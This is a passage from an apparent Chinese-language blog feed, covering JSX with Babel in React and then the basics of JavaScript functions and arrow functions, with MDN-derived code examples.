<h3 id="什么是JSX"><a href="#什么是JSX" class="headerlink" title="什么是JSX?"></a>什么是JSX?</h3><ul>
<li><p>官方：JSX is a syntax extension for JavaScript that allows you to describe your UI in a familiar HTML-like syntax. The nice thing about JSX is that apart from following three JSX rules, you don’t need to learn any new symbols or syntax outside of HTML and JavaScript.</p>
<ul>
<li>翻译： JSX是JavaScript的语法扩展，允许用熟悉的类似HTML的语法描述UI。JSX的好处在于，除了遵循三条JSX规则外，不需要学习HTML和JavaScript之外的任何新符号或语法。</li>
</ul>
</li>
<li><p>官方：Note that browsers don’t understand JSX out of the box, so you’ll need a JavaScript compiler, such as a Babel, to transform your JSX code into regular JavaScript.</p>
<ul>
<li>请注意，浏览器无法开箱即用地理解JSX，因此您需要一个JavaScript编译器，如Babel，来将您的JSX代码转换为常规JavaScript。</li>
</ul>
</li>
</ul>
<p>也就是说，浏览器并不理解这个名为 JSX的代码。但只要搭配个解释器，JSX代码也可以被转译为常规JavaScript代码，就可以运行了。</p>
<h3 id="将Babel添加进项目"><a href="#将Babel添加进项目" class="headerlink" title="将Babel添加进项目"></a>将Babel添加进项目</h3><p>将这个 <code>script</code>写入 <code>index.html</code>文件中即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同时，把<code>&lt;scritp&gt;</code>标签中的类型改了<code>type=text/jsx</code>，以此通知Babel需要转换哪些代码。</p>
<p>代码总览：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@17/umd/react.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react-dom@17/umd/react-dom.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Babel Script --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jsx&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>, app);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么我们 run 一下！</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/page_image_1.png" class="">

<p>毫无问题！</p>
<p>将React的脚本代码和普通的纯JavaScript进行对比，可以看出简洁了许多。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jsx&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>, app)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> header = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;h1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> headerContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;Develop. Preview. Ship. 🚀&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  header.<span class="title function_">appendChild</span>(headerContent);</span></span><br><span class="line"><span class="language-javascript">  app.<span class="title function_">appendChild</span>(header);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方：And this is exactly what React does, it’s a library that contains reusable snippets of code that perform tasks on your behalf - in this case, updating the UI.</p>
<pre><code>- 翻译：这正是React所做的，它是一个库，包含可重复使用的代码片段，可以代表您执行任务——在本例中，更新UI。
</code></pre>
<p>官方：Note: You don’t need to know exactly how React updates the UI to start using it, but if you’d like to learn more, take a look at the UI trees and the react-dom&#x2F;server sections in the React Documentation.</p>
<ul>
<li>注意：您不需要确切知道React是如何更新UI来开始使用它的，但如果您想了解更多信息，请查看React文档中的UI树和<code>React dom/server</code>部分。</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
        <tag>jsx</tag>
      </tags>
  </entry>
  <entry>
    <title>Next学习手册（三）- Essential JavaScript</title>
    <url>/2023/09/26/2023-9-26-Next%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%89%EF%BC%89-%20Essential-JavaScript/</url>
    <content><![CDATA[<h3 id="基本JavaScript"><a href="#基本JavaScript" class="headerlink" title="基本JavaScript"></a>基本JavaScript</h3><p>熟悉JavaScript可以帮助我们更好的学习React，本章主要讲一些基本的JavaScript，以防止因为缺少JavaScript知识导致对后面的内容难以理解。</p>
<p>如果你很熟悉JavaScript可以跳过此节。</p>
<p>JavaScript的用途非常广泛，也非常的庞大，我们从以下几个角度开始学习基本的JavaScript：</p>
<ul>
<li><p>Functions and Arrow Functions：函数和箭头函数</p>
</li>
<li><p>Object：对象</p>
</li>
<li><p>Arrays and array methods：数组和数组方法</p>
</li>
<li><p>Destructuring：解构函数</p>
</li>
<li><p>Template literals：模板文字</p>
</li>
<li><p>Ternary Operators：三元运算符</p>
</li>
<li><p>ES Modules and Import &#x2F; Export Syntax：ES 模块和导入&#x2F;导出 语法</p>
</li>
</ul>
<h2 id="函数和箭头函数"><a href="#函数和箭头函数" class="headerlink" title="函数和箭头函数"></a>函数和箭头函数</h2><p>MDN：</p>
<ul>
<li>函数是 JavaScript 中的基本组件之一。JavaScript 中的函数类似于过程——一组执行任务或计算值的语句。但要成为函数，这个过程应该接受输入并返回与输入存在某些明显关系的输出。要使用一个函数，你必须将其定义在你希望调用它的作用域内。</li>
</ul>
<h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Functions#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">函数声明</a></h3><p>一个<strong>函数定义</strong>（也称为<strong>函数声明</strong>，或<strong>函数语句</strong>）由 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function"><code>function</code></a> 关键字，并跟随以下部分组成：</p>
<ul>
<li>函数名称。</li>
<li>函数参数列表，包围在括号中并由逗号分隔。</li>
<li>定义函数的 JavaScript 语句，用大括号括起来，<code>&#123; /* … */ &#125;</code>。</li>
</ul>
<p>例如，以下的代码定义了一个简单的名为 <code>square</code> 的函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">square</span>(<span class="params">number</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> number * number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数 <code>square</code> 接收一个名为 <code>number</code> 的参数。这个函数只有一个语句，其表示该函数将函数的参数（即 <code>number</code>）自乘后返回。函数的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/return"><code>return</code></a> 语句指定了函数的返回值：<code>number * number</code>。</p>
<p>参数本质上是<strong>按值</strong>传递给函数的——因此，即使函数体的代码为传递给函数的参数赋了新值，<strong>这个改变也不会反映到全局或调用该函数的代码中</strong>。</p>
<p>如果你将对象作为参数传递，而函数改变了这个对象的属性，这样的改变对函数外部是可见的，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunc</span>(<span class="params">theObject</span>) &#123;</span><br><span class="line">  theObject.<span class="property">make</span> = <span class="string">&quot;Toyota&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mycar = &#123;</span><br><span class="line">  <span class="attr">make</span>: <span class="string">&quot;Honda&quot;</span>,</span><br><span class="line">  <span class="attr">model</span>: <span class="string">&quot;Accord&quot;</span>,</span><br><span class="line">  <span class="attr">year</span>: <span class="number">1998</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mycar.<span class="property">make</span>); <span class="comment">// &quot;Honda&quot;</span></span><br><span class="line"><span class="title function_">myFunc</span>(mycar);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mycar.<span class="property">make</span>); <span class="comment">// &quot;Toyota&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果你将数组作为参数传递，而函数改变了这个数组的值，这样的改变对函数外部也同样可见，如下面的例子所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunc</span>(<span class="params">theArr</span>) &#123;</span><br><span class="line">  theArr[<span class="number">0</span>] = <span class="number">30</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]); <span class="comment">// 45</span></span><br><span class="line"><span class="title function_">myFunc</span>(arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]); <span class="comment">// 30</span></span><br></pre></td></tr></table></figure>

<h3 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Functions#%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">函数表达式</a></h3><p>虽然上面的函数声明在语法上是一个语句，但函数也可以由<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>创建。</p>
<p>这样的函数可以是<strong>匿名</strong>的；它不必有一个名称。例如，函数 <code>square</code> 也可这样来定义：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> square = <span class="keyword">function</span> (<span class="params">number</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> number * number;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">square</span>(<span class="number">4</span>)); <span class="comment">// 16</span></span><br></pre></td></tr></table></figure>

<p>然而，<em>也可以</em>为函数表达式提供名称，并且可以用于在函数内部代指其本身，或者在调试器堆栈跟踪中识别该函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> factorial = <span class="keyword">function</span> <span class="title function_">fac</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> n &lt; <span class="number">2</span> ? <span class="number">1</span> : n * <span class="title function_">fac</span>(n - <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">factorial</span>(<span class="number">3</span>)); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>

<p>当将函数作为参数传递给另一个函数时，函数表达式很方便。下面的例子演示了一个叫 <code>map</code> 的函数，该函数接收函数作为第一个参数，接收数组作为第二个参数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">map</span>(<span class="params">f, a</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">new</span> <span class="title class_">Array</span>(a.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; a.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    result[i] = <span class="title function_">f</span>(a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在以下代码中，该函数接收由函数表达式定义的函数，并对作为第二个参数接收的数组的每个元素执行该函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">map</span>(<span class="params">f, a</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">new</span> <span class="title class_">Array</span>(a.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; a.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    result[i] = <span class="title function_">f</span>(a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x * x * x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> numbers = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">map</span>(cube, numbers)); <span class="comment">// [0, 1, 8, 125, 1000]</span></span><br></pre></td></tr></table></figure>

<p>在 JavaScript 中，可以根据条件来定义一个函数。比如下面的代码，当 <code>num</code> 等于 <code>0</code> 的时候才会定义 <code>myFunc</code>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myFunc;</span><br><span class="line"><span class="keyword">if</span> (num === <span class="number">0</span>) &#123;</span><br><span class="line">  myFunc = <span class="keyword">function</span> (<span class="params">theObject</span>) &#123;</span><br><span class="line">    theObject.<span class="property">make</span> = <span class="string">&quot;Toyota&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了上述的定义函数方法外，你也可以在运行时用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>Function</code></a> 构造函数从一个字符串创建一个函数，很像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval()</code></a> 函数。</p>
<p>以上均摘自 我很喜欢的教学网站 <a href="https://developer.mozilla.org/">MDN</a>。</p>
<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p><strong>箭头函数表达式</strong>的语法比<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>更简洁，并且没有自己的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this"><code>this</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>或<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new.target"><code>new.target</code></a>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p>
<h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(param1, param2, …, paramN) =&gt; &#123; statements &#125;</span><br><span class="line"> (param1, param2, …, paramN) =&gt; expression</span><br><span class="line"> <span class="comment">//相当于：(param1, param2, …, paramN) =&gt;&#123; return expression; &#125;</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 当只有一个参数时，圆括号是可选的：</span></span><br><span class="line"> (singleParam) =&gt; &#123; statements &#125;</span><br><span class="line"> singleParam =&gt; &#123; statements &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 没有参数的函数应该写成一对圆括号。</span></span><br><span class="line"> () =&gt; &#123; statements &#125;</span><br></pre></td></tr></table></figure>

<h3 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加括号的函数体返回对象字面量表达式：</span></span><br><span class="line">params =&gt; (&#123;<span class="attr">foo</span>: bar&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持剩余参数和默认参数</span></span><br><span class="line">(param1, param2, ...rest) =&gt; &#123; statements &#125;</span><br><span class="line">(param1 = defaultValue1, param2, …, paramN = defaultValueN) =&gt; &#123;</span><br><span class="line">statements &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同样支持参数列表解构</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">f</span> = (<span class="params">[a, b] = [<span class="number">1</span>, <span class="number">2</span>], &#123;x: c&#125; = &#123;x: a + b&#125;</span>) =&gt; a + b + c;</span><br><span class="line"><span class="title function_">f</span>();  <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>

<h3 id="没有单独的this"><a href="#没有单独的this" class="headerlink" title="没有单独的this"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E6%B2%A1%E6%9C%89%E5%8D%95%E7%8B%AC%E7%9A%84this">没有单独的<code>this</code></a></h3><p>在箭头函数出现之前，每一个新函数根据它是被如何调用的来定义这个函数的 this 值：</p>
<ul>
<li>如果该函数是一个构造函数，this 指针指向一个新的对象</li>
<li>在严格模式下的函数调用下，this 指向<code>undefined</code></li>
<li>如果该函数是一个对象的方法，则它的 this 指针指向这个对象</li>
<li>等等</li>
</ul>
<p><code>This</code>被证明是令人厌烦的面向对象风格的编程。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Person() 构造函数定义 `this`作为它自己的实例。</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">growUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 在非严格模式，growUp() 函数定义 `this`作为全局对象，</span></span><br><span class="line">    <span class="comment">// 与在 Person() 构造函数中定义的 `this`并不相同。</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure>

<p>在 ECMAScript 3&#x2F;5 中，通过将<code>this</code>值分配给封闭的变量，可以解决<code>this</code>问题。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> that = <span class="variable language_">this</span>;</span><br><span class="line">  that.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">growUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 回调引用的是`that`变量，其值是预期的对象。</span></span><br><span class="line">    that.<span class="property">age</span>++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者，可以创建<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind">绑定函数</a>，以便将预先分配的<code>this</code>值传递到绑定的目标函数（上述示例中的<code>growUp()</code>函数）。</p>
<p>箭头函数不会创建自己的<code>this，它只会从自己的作用域链的上一层继承 this</code>。因此，在下面的代码中，传递给<code>setInterval</code>的函数内的<code>this</code>与封闭函数中的<code>this</code>值相同：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>++; <span class="comment">// |this| 正确地指向 p 实例</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure>

<h4 id="与严格模式的关系"><a href="#与严格模式的关系" class="headerlink" title="与严格模式的关系"></a>与严格模式的关系</h4><p>鉴于 <code>this</code> 是词法层面上的，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode">严格模式</a>中与 <code>this</code> 相关的规则都将被忽略。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; &#123; <span class="string">&#x27;use strict&#x27;</span>; <span class="keyword">return</span> <span class="variable language_">this</span>; &#125;;</span><br><span class="line"><span class="title function_">f</span>() === <span class="variable language_">window</span>; <span class="comment">// 或者 global</span></span><br></pre></td></tr></table></figure>

<p>严格模式的其他规则依然不变。</p>
<h4 id="通过-call-或-apply-调用"><a href="#通过-call-或-apply-调用" class="headerlink" title="通过 call 或 apply 调用"></a>通过 call 或 apply 调用</h4><p>由于 箭头函数没有自己的 this 指针，通过 <code>call()</code> <em>或</em> <code>apply()</code> 方法调用一个函数时，只能传递参数（不能绑定 this—译者注），他们的第一个参数会被忽略。（这种现象对于 bind 方法同样成立 — 译者注）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adder = &#123;</span><br><span class="line">  <span class="attr">base</span>: <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">add</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params">v</span>) =&gt; v + <span class="variable language_">this</span>.<span class="property">base</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f</span>(a);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">addThruCall</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params">v</span>) =&gt; v + <span class="variable language_">this</span>.<span class="property">base</span>;</span><br><span class="line">    <span class="keyword">var</span> b = &#123;</span><br><span class="line">      <span class="attr">base</span>: <span class="number">2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f.<span class="title function_">call</span>(b, a);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(adder.<span class="title function_">add</span>(<span class="number">1</span>)); <span class="comment">// 输出 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(adder.<span class="title function_">addThruCall</span>(<span class="number">1</span>)); <span class="comment">// 仍然输出 2</span></span><br></pre></td></tr></table></figure>

<h3 id="不绑定arguments"><a href="#不绑定arguments" class="headerlink" title="不绑定arguments"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E4%B8%8D%E7%BB%91%E5%AE%9Aarguments">不绑定<code>arguments</code></a></h3><p>箭头函数不绑定<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments">Arguments 对象</a>。因此，在本示例中，<code>arguments</code>只是引用了封闭作用域内的 arguments：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">arguments</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> <span class="title function_">arr</span> = (<span class="params"></span>) =&gt; <span class="variable language_">arguments</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_">arr</span>(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="variable language_">arguments</span>[<span class="number">0</span>] + n; <span class="comment">// 隐式绑定 foo 函数的 arguments 对象。arguments[0] 是 n，即传给 foo 函数的第一个参数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">1</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">2</span>); <span class="comment">// 4</span></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">3</span>); <span class="comment">// 6</span></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">3</span>, <span class="number">2</span>); <span class="comment">//6</span></span><br></pre></td></tr></table></figure>

<p>在大多数情况下，使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/rest_parameters">剩余参数</a>是相较使用<code>arguments</code>对象的更好选择。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params">...args</span>) =&gt; args[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f</span>(arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>(<span class="number">1</span>); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg1, arg2</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title function_">f</span> = (<span class="params">...args</span>) =&gt; args[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f</span>(arg1, arg2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//2</span></span><br></pre></td></tr></table></figure>

<h3 id="使用箭头函数作为方法"><a href="#使用箭头函数作为方法" class="headerlink" title="使用箭头函数作为方法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E4%BD%BF%E7%94%A8%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E4%BD%9C%E4%B8%BA%E6%96%B9%E6%B3%95">使用箭头函数作为方法</a></h3><p>如上所述，箭头函数表达式对非方法函数是最合适的。让我们看看当我们试着把它们作为方法时发生了什么。</p>
